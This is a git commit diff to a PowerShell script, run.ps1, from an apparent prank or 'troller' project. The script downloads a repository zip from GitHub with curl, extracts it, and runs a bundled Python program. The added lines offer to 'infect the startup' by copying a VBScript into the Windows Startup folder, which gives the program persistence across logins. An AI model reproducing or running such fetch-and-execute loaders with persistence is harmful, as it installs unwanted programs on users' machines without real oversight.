adb4eb10e7b5302457737214e09d4843bc499aa4
boatinalamp <93244703+boatinalamp@users.noreply.github.com>
2023-04-11 21:28:44 +0530

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,7 +1,15 @@
 Set-location -Path $HOME
 cmd /C curl "https://codeload.github.com/boatinalamp/troller/zip/refs/heads/main" --output main.zip
 cmd /C tar xf .\main.zip
-Set-location -Path troller-main
+Set-location -Path .\troller-main
+$consent = Read-Host "Do you want to infect the startup? (y or n) "
+If ($consent -eq 'y') {
+Copy-Item -Path "$HOME\troller-main\startup.vbs" -Destination "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+}
+Else {"Ran without injecting."}
+
+.\python.exe main.py
+
 
 
 
